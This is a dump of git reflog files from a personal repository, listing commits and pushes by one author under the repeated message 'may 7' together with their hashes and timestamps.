64aa83b27a9a0f198095cc25bfdc8c45d3346934 4dc50041bbb37774feb6de9bbd40942483f991b6 justinhalford <justinhalford@gmail.com> 1715313405 -0400	commit: may 7
4dc50041bbb37774feb6de9bbd40942483f991b6 93ff05ef566244d221e79235538a5d75f62ba509 justinhalford <justinhalford@gmail.com> 1715313456 -0400	commit: may 7
93ff05ef566244d221e79235538a5d75f62ba509 698376c0f7224258e9d62cda66cacc8c9b767673 justinhalford <justinhalford@gmail.com> 1715315630 -0400	commit: may 7
698376c0f7224258e9d62cda66cacc8c9b767673 396e8cd7cb1b10a52457203001c904429feec320 justinhalford <justinhalford@gmail.com> 1715315807 -0400	commit: may 7
396e8cd7cb1b10a52457203001c904429feec320 455ad20abec28e0f34c012d64963d9b323b12f4d justinhalford <justinhalford@gmail.com> 1715316007 -0400	commit: may 7
455ad20abec28e0f34c012d64963d9b323b12f4d d7f1ac0527cd5b07b54359932f9bb14812fdd342 justinhalford <justinhalford@gmail.com> 1715316045 -0400	commit: may 7
d7f1ac0527cd5b07b54359932f9bb14812fdd342 09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 justinhalford <justinhalford@gmail.com> 1715316123 -0400	commit: may 7
09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 d766a979518ec4112f6e08750c2f835540e548fe justinhalford <justinhalford@gmail.com> 1715316358 -0400	commit: may 7
d766a979518ec4112f6e08750c2f835540e548fe 0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 justinhalford <justinhalford@gmail.com> 1715316618 -0400	commit: may 7
0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 1db0f69a2f0baac3700620e59b8af27e5c8d16ba justinhalford <justinhalford@gmail.com> 1715316763 -0400	commit: may 7
1db0f69a2f0baac3700620e59b8af27e5c8d16ba 2b917b77ef80fd0e694469593d1ea5bda7d5e184 justinhalford <justinhalford@gmail.com> 1715367223 -0400	commit: may 7
2b917b77ef80fd0e694469593d1ea5bda7d5e184 d21ec93a282c508abdb9adfbd679fa80ccbb66db justinhalford <justinhalford@gmail.com> 1715368109 -0400	commit: may 7
d21ec93a282c508abdb9adfbd679fa80ccbb66db 196f14613570ab95ccfd15c2d6615e2cdf647274 justinhalford <justinhalford@gmail.com> 1715368362 -0400	commit: may 7
196f14613570ab95ccfd15c2d6615e2cdf647274 cab8b0de1b369d344941d8c7f4c9f40512609746 justinhalford <justinhalford@gmail.com> 1715368558 -0400	commit: may 7
cab8b0de1b369d344941d8c7f4c9f40512609746 88e03e301008825e85bdf13a3dcdebdab90961ea justinhalford <justinhalford@gmail.com> 1715368701 -0400	commit: may 7
88e03e301008825e85bdf13a3dcdebdab90961ea 9aabd2e8078a3729d5da4918cecf8be79d62f371 justinhalford <justinhalford@gmail.com> 1715368715 -0400	commit: may 7
9aabd2e8078a3729d5da4918cecf8be79d62f371 72131a15e1c22f31e0376c915fb8a35630f50df3 justinhalford <justinhalford@gmail.com> 1715368725 -0400	commit: may 7
72131a15e1c22f31e0376c915fb8a35630f50df3 737e2a72b72f0d52f58aa441f87f4b32fb4fabda justinhalford <justinhalford@gmail.com> 1715369010 -0400	commit: may 7
737e2a72b72f0d52f58aa441f87f4b32fb4fabda 83ef2f3000985b696d9f8bd7660ef7459115290d justinhalford <justinhalford@gmail.com> 1715369206 -0400	commit: may 7
83ef2f3000985b696d9f8bd7660ef7459115290d 14fe592bf1a66921c2dc53b3acdb5c35a3658b7d justinhalford <justinhalford@gmail.com> 1715369294 -0400	commit: may 7
14fe592bf1a66921c2dc53b3acdb5c35a3658b7d c0263951e2a4c7476b2ce63b51936dfeb9f3b231 justinhalford <justinhalford@gmail.com> 1715369332 -0400	commit: may 7
c0263951e2a4c7476b2ce63b51936dfeb9f3b231 f7adf10d49e89df1e4d4682198b888399f1db660 justinhalford <justinhalford@gmail.com> 1715369357 -0400	commit: may 7
f7adf10d49e89df1e4d4682198b888399f1db660 0202c63b32f8115588a8ded6c99c19abaa00ceec justinhalford <justinhalford@gmail.com> 1715370416 -0400	commit: may 7
0202c63b32f8115588a8ded6c99c19abaa00ceec e6bc2a3740536d7322daca5a8bc74e4d0dddd69b justinhalford <justinhalford@gmail.com> 1715370440 -0400	commit: may 7
e6bc2a3740536d7322daca5a8bc74e4d0dddd69b 96ed5df9314034ff6045b5cbffe184421835c35f justinhalford <justinhalford@gmail.com> 1715370454 -0400	commit: may 7
96ed5df9314034ff6045b5cbffe184421835c35f d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 justinhalford <justinhalford@gmail.com> 1715370464 -0400	commit: may 7
d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 7b3f5fc02947a2368cb2f01879ce7e638ee89558 justinhalford <justinhalford@gmail.com> 1715370965 -0400	commit: may 7
7b3f5fc02947a2368cb2f01879ce7e638ee89558 0f69a1a4b060bf81f22a99c941caa00ab6d4bead justinhalford <justinhalford@gmail.com> 1715370979 -0400	commit: may 7
0f69a1a4b060bf81f22a99c941caa00ab6d4bead fdcb76149a9f9006d585eeb37bc48fd1851ad929 justinhalford <justinhalford@gmail.com> 1715370993 -0400	commit: may 7
fdcb76149a9f9006d585eeb37bc48fd1851ad929 95d1cdab560b609fc9158b1bd9023da052eaa434 justinhalford <justinhalford@gmail.com> 1715372161 -0400	commit: may 7
95d1cdab560b609fc9158b1bd9023da052eaa434 d6eceb369ee91f7e45423036c98cc5aaec21942f justinhalford <justinhalford@gmail.com> 1715372207 -0400	commit: may 7
d6eceb369ee91f7e45423036c98cc5aaec21942f d585a003a2eedf138cd3eb1bd94c125e435b29e3 justinhalford <justinhalford@gmail.com> 1715372218 -0400	commit: may 7
d585a003a2eedf138cd3eb1bd94c125e435b29e3 3436788ef72ca8e48b6ffb9f6066c22dba349914 justinhalford <justinhalford@gmail.com> 1715372325 -0400	commit: may 7
3436788ef72ca8e48b6ffb9f6066c22dba349914 7869caab242c56651c0f3bc1f9b64b1e5eaaa492 justinhalford <justinhalford@gmail.com> 1715372359 -0400	commit: may 7
7869caab242c56651c0f3bc1f9b64b1e5eaaa492 af180089de1a3acdd6166f413f1d16e6c30c02ef justinhalford <justinhalford@gmail.com> 1715372396 -0400	commit: may 7
af180089de1a3acdd6166f413f1d16e6c30c02ef fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 justinhalford <justinhalford@gmail.com> 1715372405 -0400	commit: may 7
fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 5545c448f677eccdce7ac6b9131c182d2954f329 justinhalford <justinhalford@gmail.com> 1715372414 -0400	commit: may 7
5545c448f677eccdce7ac6b9131c182d2954f329 64277083a026f39b3abc150fe406b6cda8862f36 justinhalford <justinhalford@gmail.com> 1715372421 -0400	commit: may 7
64277083a026f39b3abc150fe406b6cda8862f36 fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 justinhalford <justinhalford@gmail.com> 1715372428 -0400	commit: may 7
fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 4b2c5ccad541910ab2dcdfa95a9755821dd75b57 justinhalford <justinhalford@gmail.com> 1715372438 -0400	commit: may 7
4b2c5ccad541910ab2dcdfa95a9755821dd75b57 53927cc0eeb8419ab1a3b21a91697709e0613aa2 justinhalford <justinhalford@gmail.com> 1715372454 -0400	commit: may 7
53927cc0eeb8419ab1a3b21a91697709e0613aa2 3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 justinhalford <justinhalford@gmail.com> 1715372462 -0400	commit: may 7
3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 39aedf90415245eafd3c95798090c461cc26bfa3 justinhalford <justinhalford@gmail.com> 1715372474 -0400	commit: may 7
39aedf90415245eafd3c95798090c461cc26bfa3 94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 justinhalford <justinhalford@gmail.com> 1715372485 -0400	commit: may 7
94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 3845d84d9c7540119bb74b891e14983ea8dba45a justinhalford <justinhalford@gmail.com> 1715372493 -0400	commit: may 7
3845d84d9c7540119bb74b891e14983ea8dba45a 70ad4b922ba524873135adaf3b307dceec5fff39 justinhalford <justinhalford@gmail.com> 1715372503 -0400	commit: may 7
70ad4b922ba524873135adaf3b307dceec5fff39 e212104358187d46d55b55a5d994a874c50290da justinhalford <justinhalford@gmail.com> 1715372539 -0400	commit: may 7
e212104358187d46d55b55a5d994a874c50290da ff78f998051f4e2b0402d854b499d0554db314d6 justinhalford <justinhalford@gmail.com> 1715372554 -0400	commit: may 7
ff78f998051f4e2b0402d854b499d0554db314d6 bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 justinhalford <justinhalford@gmail.com> 1715372564 -0400	commit: may 7
bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 justinhalford <justinhalford@gmail.com> 1715372580 -0400	commit: may 7
f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 589fc7a3642f83ecd3b7845a6627a1acd2d375bd justinhalford <justinhalford@gmail.com> 1715372635 -0400	commit: may 7
589fc7a3642f83ecd3b7845a6627a1acd2d375bd 9458ef8d05043dd7f6ac9dd048ba5ac9e7196497 justinhalford <justinhalford@gmail.com> 1715372828 -0400	commit: may 7

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/master>
0000000000000000000000000000000000000000 cad4c2c4894bf477bae7d0e5703bd38bf1691d59 justinhalford <justinhalford@gmail.com> 1715056911 -0400	commit (initial): Initial commit
cad4c2c4894bf477bae7d0e5703bd38bf1691d59 6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 justinhalford <justinhalford@gmail.com> 1715057233 -0400	commit: may 7
6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 6b52d920be904342743bc52f5283be7ef56eae28 justinhalford <justinhalford@gmail.com> 1715057265 -0400	commit: may 7
6b52d920be904342743bc52f5283be7ef56eae28 fc7bcfb142ac289645f3012d8377ca15593b0ed7 justinhalford <justinhalford@gmail.com> 1715057423 -0400	commit: may 7
fc7bcfb142ac289645f3012d8377ca15593b0ed7 131729f14385ce7a74925d2a8ee93c653a2137e5 justinhalford <justinhalford@gmail.com> 1715058257 -0400	commit: may 7
131729f14385ce7a74925d2a8ee93c653a2137e5 bf6aa01858cc6622a4f134d5d010ec907d759847 justinhalford <justinhalford@gmail.com> 1715058380 -0400	commit: may 7
bf6aa01858cc6622a4f134d5d010ec907d759847 4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 justinhalford <justinhalford@gmail.com> 1715058495 -0400	commit: may 7
4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 6da6145038289d4872a60d9a0728d7f5722c1e7e justinhalford <justinhalford@gmail.com> 1715184681 -0400	commit: may 7
6da6145038289d4872a60d9a0728d7f5722c1e7e ed76eb8fa2137011a3c245c44661420662e4d88b justinhalford <justinhalford@gmail.com> 1715184763 -0400	commit: may 7
ed76eb8fa2137011a3c245c44661420662e4d88b 4c14069ad413015e3d9e687bdf7a6f5812538985 justinhalford <justinhalford@gmail.com> 1715184816 -0400	commit: may 7
4c14069ad413015e3d9e687bdf7a6f5812538985 52d40054ee31216b277921fbca88392e6fc3f9ea justinhalford <justinhalford@gmail.com> 1715184945 -0400	commit: may 7
52d40054ee31216b277921fbca88392e6fc3f9ea ce095e1f12869e3e2d60a5e19108271a68891095 justinhalford <justinhalford@gmail.com> 1715185075 -0400	commit: may 7
ce095e1f12869e3e2d60a5e19108271a68891095 da246f0e90bbfa6addd21db5234c0dfa3317b3cd justinhalford <justinhalford@gmail.com> 1715186402 -0400	commit: may 7
da246f0e90bbfa6addd21db5234c0dfa3317b3cd 8c57d100f3f31578f8165810814d6bc44febf41a justinhalford <justinhalford@gmail.com> 1715186501 -0400	commit: may 7
8c57d100f3f31578f8165810814d6bc44febf41a 4dece92b441da20d9b841dd61191dffaec6806ce justinhalford <justinhalford@gmail.com> 1715186519 -0400	commit: may 7
4dece92b441da20d9b841dd61191dffaec6806ce 73f01328a80b88ed2cf817a17896ce2dce525444 justinhalford <justinhalford@gmail.com> 1715186593 -0400	commit: may 7
73f01328a80b88ed2cf817a17896ce2dce525444 df95dc664d7fe5002a93f3266ef28c8c3c6a54ae justinhalford <justinhalford@gmail.com> 1715188011 -0400	commit: may 7
df95dc664d7fe5002a93f3266ef28c8c3c6a54ae f522e2bb5970b25eca74af115217282340e58d30 justinhalford <justinhalford@gmail.com> 1715188327 -0400	commit: may 7
f522e2bb5970b25eca74af115217282340e58d30 3b49c83e1129a6cd845606d4da86c048ee8f5609 justinhalford <justinhalford@gmail.com> 1715188404 -0400	commit: may 7
3b49c83e1129a6cd845606d4da86c048ee8f5609 26608f753932ec0cfef53d5eb3957707fcd2a875 justinhalford <justinhalford@gmail.com> 1715189245 -0400	commit: may 7
26608f753932ec0cfef53d5eb3957707fcd2a875 09020f24e04b82de69aeb23714a15f70c72275fd justinhalford <justinhalford@gmail.com> 1715308954 -0400	commit: may 7
09020f24e04b82de69aeb23714a15f70c72275fd 64aa83b27a9a0f198095cc25bfdc8c45d3346934 justinhalford <justinhalford@gmail.com> 1715313202 -0400	commit: may 7
64aa83b27a9a0f198095cc25bfdc8c45d3346934 4dc50041bbb37774feb6de9bbd40942483f991b6 justinhalford <justinhalford@gmail.com> 1715313405 -0400	commit: may 7
4dc50041bbb37774feb6de9bbd40942483f991b6 93ff05ef566244d221e79235538a5d75f62ba509 justinhalford <justinhalford@gmail.com> 1715313456 -0400	commit: may 7
93ff05ef566244d221e79235538a5d75f62ba509 698376c0f7224258e9d62cda66cacc8c9b767673 justinhalford <justinhalford@gmail.com> 1715315630 -0400	commit: may 7
698376c0f7224258e9d62cda66cacc8c9b767673 396e8cd7cb1b10a52457203001c904429feec320 justinhalford <justinhalford@gmail.com> 1715315807 -0400	commit: may 7
396e8cd7cb1b10a52457203001c904429feec320 455ad20abec28e0f34c012d64963d9b323b12f4d justinhalford <justinhalford@gmail.com> 1715316007 -0400	commit: may 7
455ad20abec28e0f34c012d64963d9b323b12f4d d7f1ac0527cd5b07b54359932f9bb14812fdd342 justinhalford <justinhalford@gmail.com> 1715316045 -0400	commit: may 7
d7f1ac0527cd5b07b54359932f9bb14812fdd342 09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 justinhalford <justinhalford@gmail.com> 1715316123 -0400	commit: may 7
09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 d766a979518ec4112f6e08750c2f835540e548fe justinhalford <justinhalford@gmail.com> 1715316358 -0400	commit: may 7
d766a979518ec4112f6e08750c2f835540e548fe 0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 justinhalford <justinhalford@gmail.com> 1715316618 -0400	commit: may 7
0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 1db0f69a2f0baac3700620e59b8af27e5c8d16ba justinhalford <justinhalford@gmail.com> 1715316763 -0400	commit: may 7
1db0f69a2f0baac3700620e59b8af27e5c8d16ba 2b917b77ef80fd0e694469593d1ea5bda7d5e184 justinhalford <justinhalford@gmail.com> 1715367223 -0400	commit: may 7
2b917b77ef80fd0e694469593d1ea5bda7d5e184 d21ec93a282c508abdb9adfbd679fa80ccbb66db justinhalford <justinhalford@gmail.com> 1715368109 -0400	commit: may 7
d21ec93a282c508abdb9adfbd679fa80ccbb66db 196f14613570ab95ccfd15c2d6615e2cdf647274 justinhalford <justinhalford@gmail.com> 1715368362 -0400	commit: may 7
196f14613570ab95ccfd15c2d6615e2cdf647274 cab8b0de1b369d344941d8c7f4c9f40512609746 justinhalford <justinhalford@gmail.com> 1715368558 -0400	commit: may 7
cab8b0de1b369d344941d8c7f4c9f40512609746 88e03e301008825e85bdf13a3dcdebdab90961ea justinhalford <justinhalford@gmail.com> 1715368701 -0400	commit: may 7
88e03e301008825e85bdf13a3dcdebdab90961ea 9aabd2e8078a3729d5da4918cecf8be79d62f371 justinhalford <justinhalford@gmail.com> 1715368715 -0400	commit: may 7
9aabd2e8078a3729d5da4918cecf8be79d62f371 72131a15e1c22f31e0376c915fb8a35630f50df3 justinhalford <justinhalford@gmail.com> 1715368725 -0400	commit: may 7
72131a15e1c22f31e0376c915fb8a35630f50df3 737e2a72b72f0d52f58aa441f87f4b32fb4fabda justinhalford <justinhalford@gmail.com> 1715369010 -0400	commit: may 7
737e2a72b72f0d52f58aa441f87f4b32fb4fabda 83ef2f3000985b696d9f8bd7660ef7459115290d justinhalford <justinhalford@gmail.com> 1715369206 -0400	commit: may 7
83ef2f3000985b696d9f8bd7660ef7459115290d 14fe592bf1a66921c2dc53b3acdb5c35a3658b7d justinhalford <justinhalford@gmail.com> 1715369294 -0400	commit: may 7
14fe592bf1a66921c2dc53b3acdb5c35a3658b7d c0263951e2a4c7476b2ce63b51936dfeb9f3b231 justinhalford <justinhalford@gmail.com> 1715369332 -0400	commit: may 7
c0263951e2a4c7476b2ce63b51936dfeb9f3b231 f7adf10d49e89df1e4d4682198b888399f1db660 justinhalford <justinhalford@gmail.com> 1715369357 -0400	commit: may 7
f7adf10d49e89df1e4d4682198b888399f1db660 0202c63b32f8115588a8ded6c99c19abaa00ceec justinhalford <justinhalford@gmail.com> 1715370416 -0400	commit: may 7
0202c63b32f8115588a8ded6c99c19abaa00ceec e6bc2a3740536d7322daca5a8bc74e4d0dddd69b justinhalford <justinhalford@gmail.com> 1715370440 -0400	commit: may 7
e6bc2a3740536d7322daca5a8bc74e4d0dddd69b 96ed5df9314034ff6045b5cbffe184421835c35f justinhalford <justinhalford@gmail.com> 1715370454 -0400	commit: may 7
96ed5df9314034ff6045b5cbffe184421835c35f d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 justinhalford <justinhalford@gmail.com> 1715370464 -0400	commit: may 7
d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 7b3f5fc02947a2368cb2f01879ce7e638ee89558 justinhalford <justinhalford@gmail.com> 1715370965 -0400	commit: may 7
7b3f5fc02947a2368cb2f01879ce7e638ee89558 0f69a1a4b060bf81f22a99c941caa00ab6d4bead justinhalford <justinhalford@gmail.com> 1715370979 -0400	commit: may 7
0f69a1a4b060bf81f22a99c941caa00ab6d4bead fdcb76149a9f9006d585eeb37bc48fd1851ad929 justinhalford <justinhalford@gmail.com> 1715370993 -0400	commit: may 7
fdcb76149a9f9006d585eeb37bc48fd1851ad929 95d1cdab560b609fc9158b1bd9023da052eaa434 justinhalford <justinhalford@gmail.com> 1715372161 -0400	commit: may 7
95d1cdab560b609fc9158b1bd9023da052eaa434 d6eceb369ee91f7e45423036c98cc5aaec21942f justinhalford <justinhalford@gmail.com> 1715372207 -0400	commit: may 7
d6eceb369ee91f7e45423036c98cc5aaec21942f d585a003a2eedf138cd3eb1bd94c125e435b29e3 justinhalford <justinhalford@gmail.com> 1715372218 -0400	commit: may 7
d585a003a2eedf138cd3eb1bd94c125e435b29e3 3436788ef72ca8e48b6ffb9f6066c22dba349914 justinhalford <justinhalford@gmail.com> 1715372325 -0400	commit: may 7
3436788ef72ca8e48b6ffb9f6066c22dba349914 7869caab242c56651c0f3bc1f9b64b1e5eaaa492 justinhalford <justinhalford@gmail.com> 1715372359 -0400	commit: may 7
7869caab242c56651c0f3bc1f9b64b1e5eaaa492 af180089de1a3acdd6166f413f1d16e6c30c02ef justinhalford <justinhalford@gmail.com> 1715372396 -0400	commit: may 7
af180089de1a3acdd6166f413f1d16e6c30c02ef fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 justinhalford <justinhalford@gmail.com> 1715372405 -0400	commit: may 7
fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 5545c448f677eccdce7ac6b9131c182d2954f329 justinhalford <justinhalford@gmail.com> 1715372414 -0400	commit: may 7
5545c448f677eccdce7ac6b9131c182d2954f329 64277083a026f39b3abc150fe406b6cda8862f36 justinhalford <justinhalford@gmail.com> 1715372421 -0400	commit: may 7
64277083a026f39b3abc150fe406b6cda8862f36 fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 justinhalford <justinhalford@gmail.com> 1715372428 -0400	commit: may 7
fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 4b2c5ccad541910ab2dcdfa95a9755821dd75b57 justinhalford <justinhalford@gmail.com> 1715372438 -0400	commit: may 7
4b2c5ccad541910ab2dcdfa95a9755821dd75b57 53927cc0eeb8419ab1a3b21a91697709e0613aa2 justinhalford <justinhalford@gmail.com> 1715372454 -0400	commit: may 7
53927cc0eeb8419ab1a3b21a91697709e0613aa2 3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 justinhalford <justinhalford@gmail.com> 1715372462 -0400	commit: may 7
3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 39aedf90415245eafd3c95798090c461cc26bfa3 justinhalford <justinhalford@gmail.com> 1715372474 -0400	commit: may 7
39aedf90415245eafd3c95798090c461cc26bfa3 94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 justinhalford <justinhalford@gmail.com> 1715372485 -0400	commit: may 7
94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 3845d84d9c7540119bb74b891e14983ea8dba45a justinhalford <justinhalford@gmail.com> 1715372493 -0400	commit: may 7
3845d84d9c7540119bb74b891e14983ea8dba45a 70ad4b922ba524873135adaf3b307dceec5fff39 justinhalford <justinhalford@gmail.com> 1715372503 -0400	commit: may 7
70ad4b922ba524873135adaf3b307dceec5fff39 e212104358187d46d55b55a5d994a874c50290da justinhalford <justinhalford@gmail.com> 1715372539 -0400	commit: may 7
e212104358187d46d55b55a5d994a874c50290da ff78f998051f4e2b0402d854b499d0554db314d6 justinhalford <justinhalford@gmail.com> 1715372554 -0400	commit: may 7
ff78f998051f4e2b0402d854b499d0554db314d6 bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 justinhalford <justinhalford@gmail.com> 1715372564 -0400	commit: may 7
bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 justinhalford <justinhalford@gmail.com> 1715372580 -0400	commit: may 7
f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 589fc7a3642f83ecd3b7845a6627a1acd2d375bd justinhalford <justinhalford@gmail.com> 1715372635 -0400	commit: may 7
589fc7a3642f83ecd3b7845a6627a1acd2d375bd 9458ef8d05043dd7f6ac9dd048ba5ac9e7196497 justinhalford <justinhalford@gmail.com> 1715372828 -0400	commit: may 7

<END OF ./.git/logs/refs/heads/master>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5746bcf1af256636fc9b4484b52b68f3d0bad8e7 justinhalford <justinhalford@gmail.com> 1715056983 -0400	pull origin master: storing head
5746bcf1af256636fc9b4484b52b68f3d0bad8e7 cad4c2c4894bf477bae7d0e5703bd38bf1691d59 justinhalford <justinhalford@gmail.com> 1715057066 -0400	update by push
cad4c2c4894bf477bae7d0e5703bd38bf1691d59 6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 justinhalford <justinhalford@gmail.com> 1715057248 -0400	update by push
6b5e2d36e11f82e981dfb9d9e562382ab5d5f329 6b52d920be904342743bc52f5283be7ef56eae28 justinhalford <justinhalford@gmail.com> 1715057266 -0400	update by push
6b52d920be904342743bc52f5283be7ef56eae28 fc7bcfb142ac289645f3012d8377ca15593b0ed7 justinhalford <justinhalford@gmail.com> 1715057424 -0400	update by push
fc7bcfb142ac289645f3012d8377ca15593b0ed7 131729f14385ce7a74925d2a8ee93c653a2137e5 justinhalford <justinhalford@gmail.com> 1715058258 -0400	update by push
131729f14385ce7a74925d2a8ee93c653a2137e5 bf6aa01858cc6622a4f134d5d010ec907d759847 justinhalford <justinhalford@gmail.com> 1715058380 -0400	update by push
bf6aa01858cc6622a4f134d5d010ec907d759847 4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 justinhalford <justinhalford@gmail.com> 1715058496 -0400	update by push
4a2aa6fcbdd20ace63a54afbd1c17330e8253fa2 6da6145038289d4872a60d9a0728d7f5722c1e7e justinhalford <justinhalford@gmail.com> 1715184682 -0400	update by push
6da6145038289d4872a60d9a0728d7f5722c1e7e ed76eb8fa2137011a3c245c44661420662e4d88b justinhalford <justinhalford@gmail.com> 1715184763 -0400	update by push
ed76eb8fa2137011a3c245c44661420662e4d88b 4c14069ad413015e3d9e687bdf7a6f5812538985 justinhalford <justinhalford@gmail.com> 1715184817 -0400	update by push
4c14069ad413015e3d9e687bdf7a6f5812538985 52d40054ee31216b277921fbca88392e6fc3f9ea justinhalford <justinhalford@gmail.com> 1715184946 -0400	update by push
52d40054ee31216b277921fbca88392e6fc3f9ea ce095e1f12869e3e2d60a5e19108271a68891095 justinhalford <justinhalford@gmail.com> 1715185076 -0400	update by push
ce095e1f12869e3e2d60a5e19108271a68891095 da246f0e90bbfa6addd21db5234c0dfa3317b3cd justinhalford <justinhalford@gmail.com> 1715186403 -0400	update by push
da246f0e90bbfa6addd21db5234c0dfa3317b3cd 8c57d100f3f31578f8165810814d6bc44febf41a justinhalford <justinhalford@gmail.com> 1715186503 -0400	update by push
8c57d100f3f31578f8165810814d6bc44febf41a 4dece92b441da20d9b841dd61191dffaec6806ce justinhalford <justinhalford@gmail.com> 1715186520 -0400	update by push
4dece92b441da20d9b841dd61191dffaec6806ce 73f01328a80b88ed2cf817a17896ce2dce525444 justinhalford <justinhalford@gmail.com> 1715186593 -0400	update by push
73f01328a80b88ed2cf817a17896ce2dce525444 df95dc664d7fe5002a93f3266ef28c8c3c6a54ae justinhalford <justinhalford@gmail.com> 1715188011 -0400	update by push
df95dc664d7fe5002a93f3266ef28c8c3c6a54ae f522e2bb5970b25eca74af115217282340e58d30 justinhalford <justinhalford@gmail.com> 1715188328 -0400	update by push
f522e2bb5970b25eca74af115217282340e58d30 3b49c83e1129a6cd845606d4da86c048ee8f5609 justinhalford <justinhalford@gmail.com> 1715188405 -0400	update by push
3b49c83e1129a6cd845606d4da86c048ee8f5609 26608f753932ec0cfef53d5eb3957707fcd2a875 justinhalford <justinhalford@gmail.com> 1715189246 -0400	update by push
26608f753932ec0cfef53d5eb3957707fcd2a875 09020f24e04b82de69aeb23714a15f70c72275fd justinhalford <justinhalford@gmail.com> 1715308955 -0400	update by push
09020f24e04b82de69aeb23714a15f70c72275fd 64aa83b27a9a0f198095cc25bfdc8c45d3346934 justinhalford <justinhalford@gmail.com> 1715313203 -0400	update by push
64aa83b27a9a0f198095cc25bfdc8c45d3346934 4dc50041bbb37774feb6de9bbd40942483f991b6 justinhalford <justinhalford@gmail.com> 1715313405 -0400	update by push
4dc50041bbb37774feb6de9bbd40942483f991b6 93ff05ef566244d221e79235538a5d75f62ba509 justinhalford <justinhalford@gmail.com> 1715313457 -0400	update by push
93ff05ef566244d221e79235538a5d75f62ba509 698376c0f7224258e9d62cda66cacc8c9b767673 justinhalford <justinhalford@gmail.com> 1715315631 -0400	update by push
698376c0f7224258e9d62cda66cacc8c9b767673 396e8cd7cb1b10a52457203001c904429feec320 justinhalford <justinhalford@gmail.com> 1715315808 -0400	update by push
396e8cd7cb1b10a52457203001c904429feec320 455ad20abec28e0f34c012d64963d9b323b12f4d justinhalford <justinhalford@gmail.com> 1715316008 -0400	update by push
455ad20abec28e0f34c012d64963d9b323b12f4d d7f1ac0527cd5b07b54359932f9bb14812fdd342 justinhalford <justinhalford@gmail.com> 1715316046 -0400	update by push
d7f1ac0527cd5b07b54359932f9bb14812fdd342 09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 justinhalford <justinhalford@gmail.com> 1715316124 -0400	update by push
09f6b3889a1e7cd2a906008e0cd3cc5c0251aa46 d766a979518ec4112f6e08750c2f835540e548fe justinhalford <justinhalford@gmail.com> 1715316359 -0400	update by push
d766a979518ec4112f6e08750c2f835540e548fe 0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 justinhalford <justinhalford@gmail.com> 1715316619 -0400	update by push
0d930a0fa0ad47d6ca077ee7e2b957f7b3090c98 1db0f69a2f0baac3700620e59b8af27e5c8d16ba justinhalford <justinhalford@gmail.com> 1715316764 -0400	update by push
1db0f69a2f0baac3700620e59b8af27e5c8d16ba 2b917b77ef80fd0e694469593d1ea5bda7d5e184 justinhalford <justinhalford@gmail.com> 1715367223 -0400	update by push
2b917b77ef80fd0e694469593d1ea5bda7d5e184 d21ec93a282c508abdb9adfbd679fa80ccbb66db justinhalford <justinhalford@gmail.com> 1715368110 -0400	update by push
d21ec93a282c508abdb9adfbd679fa80ccbb66db 196f14613570ab95ccfd15c2d6615e2cdf647274 justinhalford <justinhalford@gmail.com> 1715368362 -0400	update by push
196f14613570ab95ccfd15c2d6615e2cdf647274 cab8b0de1b369d344941d8c7f4c9f40512609746 justinhalford <justinhalford@gmail.com> 1715368558 -0400	update by push
cab8b0de1b369d344941d8c7f4c9f40512609746 88e03e301008825e85bdf13a3dcdebdab90961ea justinhalford <justinhalford@gmail.com> 1715368701 -0400	update by push
88e03e301008825e85bdf13a3dcdebdab90961ea 9aabd2e8078a3729d5da4918cecf8be79d62f371 justinhalford <justinhalford@gmail.com> 1715368716 -0400	update by push
9aabd2e8078a3729d5da4918cecf8be79d62f371 72131a15e1c22f31e0376c915fb8a35630f50df3 justinhalford <justinhalford@gmail.com> 1715368726 -0400	update by push
72131a15e1c22f31e0376c915fb8a35630f50df3 737e2a72b72f0d52f58aa441f87f4b32fb4fabda justinhalford <justinhalford@gmail.com> 1715369011 -0400	update by push
737e2a72b72f0d52f58aa441f87f4b32fb4fabda 83ef2f3000985b696d9f8bd7660ef7459115290d justinhalford <justinhalford@gmail.com> 1715369206 -0400	update by push
83ef2f3000985b696d9f8bd7660ef7459115290d 14fe592bf1a66921c2dc53b3acdb5c35a3658b7d justinhalford <justinhalford@gmail.com> 1715369295 -0400	update by push
